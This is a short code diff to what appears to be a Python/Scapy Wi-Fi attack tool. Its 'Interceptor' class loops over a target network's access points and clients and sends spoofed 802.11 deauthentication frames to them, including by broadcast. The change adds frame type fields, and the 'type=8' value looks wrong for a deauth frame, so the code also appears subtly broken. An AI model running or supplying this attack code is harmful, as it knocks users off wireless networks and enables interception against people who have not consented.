@@ -163,7 +163,7 @@ class Interceptor:
             self.attack_loop_count += 1
             for ap_mac in possible_ap_mac_addrs:
                 sendp(rd_frm /
-                      Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
+                      Dot11(type=8, subtype=12, addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                       deauth_frm,
                       iface=self.interface)  # todo broadcast works?
                 for client_mac in self._active_aps[self.target_ssid]["clients"]:
@@ -236,3 +236,7 @@ if __name__ == "__main__":
     invalidate_print()  # after arg parsing
     attacker = Interceptor(net_iface=pargs.net_iface)
     attacker.run()
+
+# TODO
+# todo mode of dot11 a/b/n etc...
+# todo broadcast ??
